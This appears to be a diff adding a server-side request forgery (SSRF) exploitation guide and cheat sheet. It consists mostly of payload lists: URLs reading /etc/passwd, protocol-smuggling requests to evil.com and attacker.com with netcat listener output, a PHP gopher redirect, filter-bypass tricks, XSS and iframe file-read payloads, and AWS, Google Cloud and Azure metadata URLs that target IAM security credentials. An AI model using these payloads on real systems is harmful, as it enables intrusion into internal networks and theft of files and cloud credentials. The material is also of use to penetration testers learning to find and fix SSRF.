@@ -1,0 +1,240 @@
+-------------------------Server Side RequestForgery-------------------------------------
+
+What is SSRF?
+
+Server-side request forgery (also known as SSRF) is a web security vulnerability that 
+allows an attacker to induce the server-side application to make HTTP requests to an 
+arbitrary domain of the attacker's choosing.
+
+In typical SSRF examples, the attacker might cause the server to make a connection back 
+to itself, or to other web-based services within the organization's infrastructure, 
+or to external third-party systems.
+-----------------------------------------------------------------------------------------
+How to Identify and Exploit SSRF?
+
+    Identify any request parameters that appear to contain hostnames, IP addresses, or full URLs.
+    For each parameter, modify its value to specify an alternative resource, similar to the one being requested
+    Check if that resource appears in the server’s response.
+    Define a URL targeting a server on the Internet that you regulate, and monitor for incoming connections from the application you are testing.
+    If no incoming connection is received, monitor the time taken for the application to respond.
+    If there is a delay, the application’s back-end requests may be timing out due to network restrictions on outbound connections.
+    If a successful connection with an arbitrary URL is established, try to perform the following: 
+-----------------------------------------------------------------------------------------
+What can we do with SSRF?
+1. SSRF to Reflected XSS
+2. Try URL schemas to read internal and make server perform actions (file:///, dict://, ftp://, gopher://..)
+3. We can scan for internal networks and ports.
+Well, the list is endless and left for your creativity.
+-----------------------------------------------------------------------------------------
+Vulnerable Parameters:
+
+try with this params refered in =, : 
+?/url=
+?/file=
+?/src=
+?/uri=
+?/dict=
+?/path=
+-----------------------------------------------------------------------------------------
+-->http://coolapp.com/profilepics?url=file:///etc/passwd
+-->https://help.redacted.com/plugins/servlet/oauth/users/icon-uri?consumerUri=http://127.0.0.1:4848/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
+-->GET /?url=http://malicious.com/ HTTP/1.1
+Host: victim.com
+GET /attachment/externalFile?service_type=O&file_reference=MYONEDRIVEFILELINKHERE&file_name=FILENAME.ANYTHING&
+-----------------------------------------------------------------------------------------
+Complete Testing SSRF
+Now, I will explain these 3 attacks below:
+1. SSRF to Reflected XSS:
+Well, it’s not as difficult as it sounds, and many of my more brilliant readers would have already got the idea.
+Anyway, for the ones who are still wondering, It’s way too simple, Just fetch a file from an external server which has malicious payload with content type served as HTML.
+Example — http://localhost:9999/?url=http://evil.com/payload.svg
+2. Testing URL schemas:
+The first thing to do when we find an SSRF is to test all the wrapper which are working, if the server blocks one wrapper, go and try another. if it’s your lucky day you might find one wrapper not blacklisted.
+
+file:///
+dict://
+sftp://
+ldap://
+tftp://
+gopher://
+
+i. file:// -
+File is used to fetch a file from the file system.
+
+Example:
+http://victim.com/ssrf.php?url=file:///etc/passwd
+http://victim.com/ssrf.php?url=file:///C:/Windows/win.ini
+
+ii. dict://-
+DICT URL scheme is used to refer to definitions or word lists available using the DICT protocol:
+
+http://example.com/ssrf.php?dict://evil.com:1337/
+
+evil.com:$ nc -lvp 1337
+Connection from [192.168.0.12] port 1337 [tcp/*] accepted (family 2, sport 31126)
+CLIENT libcurl 7.40.0
+
+iii. sftp:// -
+Sftp stands for SSH File Transfer Protocol, or Secure File Transfer Protocol is a separate protocol packaged with SSH that works in a similar way over a secure connection.
+
+http://example.com/ssrf.php?url=sftp://evil.com:1337/
+
+evil.com:$ nc -lvp 1337
+Connection from [192.168.0.12] port 1337 [tcp/*] accepted (family 2, sport 37146)
+SSH-2.0-libssh2_1.4.2
+
+iv. ldap:// or ldaps:// or ldapi:// -
+LDAP stands for Lightweight Directory Access Protocol. It is an application protocol used over an IP network to manage and access the distributed directory information service.
+
+http://example.com/ssrf.php?url=ldap://localhost:1337/%0astats%0aquit
+http://example.com/ssrf.php?url=ldaps://localhost:1337/%0astats%0aquit
+http://example.com/ssrf.php?url=lda pi://localhost:1337/%0astats%0aquit
+
+v. tftp:// -
+Trivial File Transfer Protocol is a simple lockstep File Transfer Protocol which allows a client to get a file from or put a file onto a remote host
+
+http://example.com/ssrf.php?url=tftp://evil.com:1337/TESTUDPPACKET
+
+evil.com:# nc -lvup 1337
+Listening on [0.0.0.0] (family 0, port 1337)
+TESTUDPPACKEToctettsize0blksize512timeout3
+
+vi. gopher:// -
+Gopher is a distributed document delivery service. It allows users to explore, search and retrieve information residing on different locations in a seamless fashion.
+
+http://example.com/ssrf.php?url=http://attacker.com/gopher.phpgopher.php (host it on acttacker.com):-
+
+<?php
+header(‘Location: gopher://evil.com:1337/_Hi%0Assrf%0Atest’);
+?>
+
+evil.com:# nc -lvp 1337
+Listening on [0.0.0.0] (family 0, port 1337)
+Connection from [192.168.0.12] port 1337 [tcp/*] accepted (family 2, sport 49398)
+Hi
+ssrf
+test
+
+-----------------------------------------------------------------------------------------
+Bypassing restrictions using Special characters:
+
+There could be further restrictions in redirecting the application internally, externally, or accessing any resources. You can try to bypass such restrictions, using special characters to modify the requested resource.
+
+?url=http://safesite.com&site.com
+?url=http://////////////site.com/
+?url=http://site@com/account/edit.aspx
+?url=http://site.com/account/edit.aspx
+?url=http://safesite.com?.site.com
+?url=http://safesite.com#.site.com
+?url=http://safesite.com\.site.com/domain
+?url=https://ⓈⒾⓉⒺ.ⓒⓞⓜ = site.com
+?url=https://192.10.10.3/
+?url=https://192.10.10.2?.192.10.10.3/
+?url=https://192.10.10.2#.192.10.10.3/
+?url=https://192.10.10.2\.192.10.10.3/
+?url=http://127.0.0.1/status/
+?url=http://localhost:8000/status/
+-----------------------------------------------------------------------------------------
+Bypassing restrictions using HTTP Redirections:
+
+You can try implementing a similar snippet in the request, if successfully processed by the server, will redirect you to the destination:
+
+?url=http://site.com/domain.php
+<?php
+header(‘Location: http://127.0.0.1:8080/status');
+?>
+-----------------------------------------------------------------------------------------
+Reference:
+https://medium.com/@briskinfosec/ssrf-server-side-request-forgery-ae44ec737cb8
+https://medium.com/@zain.sabahat/exploiting-ssrf-like-a-boss-c090dc63d326
+https://54m4ri74n.medium.com/ssrf-server-side-request-forgery-5131ffd61c3c
+https://medium.com/@madrobot/ssrf-server-side-request-forgery-types-and-ways-to-exploit-it-part-1-29d034c27978
+-----------------------------------------------------------------------------------------
+Easy Understand:
+-->https://www.vaadata.com/blog/exploiting-the-ssrf-vulnerability/
+-->https://www.acunetix.com/blog/articles/server-side-request-forgery-vulnerability/
+-----------------------------------------------------------------------------------------
+CHEATSHEET
+
+Below you will find my cheatsheet for exploiting Server Side Request Forgery (SSRF):
+
+--------------------------------------------------------------------     
+Optional to read Reference:
+Detection:
+Check out parameters such as /file=, /path=, /src= to see if the application can send request only to whitelisted applications
+
+Check out if there is PDF or any other file export tool in place which may be vulnerable to SSRF
+
+--------------------------------------------------------------------
+__Basic localhost Payloads:__
+http://127.0.0.1:port
+http://localhost:port
+https://127.0.0.1:port
+https://localhost:port
+http://[::]:port
+http://0000::1:port
+http://[0:0:0:0:0:ffff:127.0.0.1]
+http://0/
+http://127.1
+http://127.0.1
+
+--------------------------------------------------------------------
+__File path:__
+/etc/passwd
+file:///etc/passwd
+file://path/to/file
+file://\/\/etc/passwd
+
+--------------------------------------------------------------------
+__With other protocols:__
+sftp://attacker.com:port/
+dict://attacker:port/
+tftp://attacker.com:port/
+ldap://localhost:port/
+gopher://127.0.0.1:port/
+
+--------------------------------------------------------------------
+__From XSS:__
+\<img src="xxx" onerror="document.write('\<iframe src=file:///etc/passwd>\</iframe>')"/>\
+\<link rel=attachment href="file:///etc/passwd">\
+
+--------------------------------------------------------------------
+__With iframe injection:__
+<?php $file = $_GET['file']; header("location:file://$file");?>
+\<iframe src="http://attacker-ip/test.php?file=/etc/passwd">\</iframe>\
+
+--------------------------------------------------------------------
+__AWS:__
+http://instance-data
+http://169.254.169.254
+http://169.254.169.254/latest/user-data
+http://169.254.169.254/latest/user-data/iam/security-credentials/[ROLE NAME]
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]
+http://169.254.169.254/latest/meta-data/iam/security-credentials/PhotonInstance
+http://169.254.169.254/latest/meta-data/ami-id
+http://169.254.169.254/latest/meta-data/reservation-id
+http://169.254.169.254/latest/meta-data/hostname
+http://169.254.169.254/latest/meta-data/public-keys/
+http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
+http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key
+http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy
+http://169.254.169.254/latest/meta-data/iam/security-credentials/s3access
+http://169.254.169.254/latest/dynamic/instance-identity/document
+
+--------------------------------------------------------------------
+__Google Cloud:__
+http://169.254.169.254/computeMetadata/v1/
+http://metadata.google.internal/computeMetadata/v1/
+http://metadata/computeMetadata/v1/
+http://metadata.google.internal/computeMetadata/v1/instance/hostname
+http://metadata.google.internal/computeMetadata/v1/instance/id
+http://metadata.google.internal/computeMetadata/v1/project/project-id
+
+--------------------------------------------------------------------
+Azure:
+http://169.254.169.254/metadata/v1/maintenance
+http://169.254.169.254/metadata/instance?api-version=2017-04-02
+http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&format=text
+
+--------------------------------------------------------------------
